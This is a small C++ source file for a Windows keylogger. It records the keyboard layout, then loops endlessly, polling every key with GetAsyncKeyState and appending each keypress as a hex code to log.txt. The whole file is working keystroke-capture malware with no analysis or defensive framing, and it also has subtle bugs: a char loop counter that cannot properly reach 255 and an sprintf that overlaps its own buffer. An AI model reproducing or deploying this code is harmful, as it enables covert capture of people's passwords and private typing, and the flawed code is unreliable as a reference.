// keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <Windows.h>

#pragma warning(disable:4996)

void LogFile(char* lpBuffer, LPCSTR fname);


int main() {
	char lpBuffer[100];
	GetKeyboardLayoutNameA(lpBuffer);
	sprintf(lpBuffer, "%s\n", lpBuffer);
	LogFile(lpBuffer, (char*)"log.txt");

	while (true) {
		for (char i = 1; i <= 255; i++) {
			if (GetAsyncKeyState(i) & 1) {
				sprintf(lpBuffer, "\\x%02x", i);
				LogFile(lpBuffer, (char*)"log.txt");
			}
		}
		Sleep(5);  // 5 milliseconds for other applications to run
	}
	return 0;
}

void LogFile(char* lpBuffer, LPCSTR fname) {

	BOOL bErrorFlag;
	DWORD dwBytesWritten;

	HANDLE hFile = CreateFileA(fname, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	bErrorFlag = WriteFile(hFile, lpBuffer, strlen(lpBuffer), &dwBytesWritten, NULL);
	CloseHandle(hFile);

	return;
}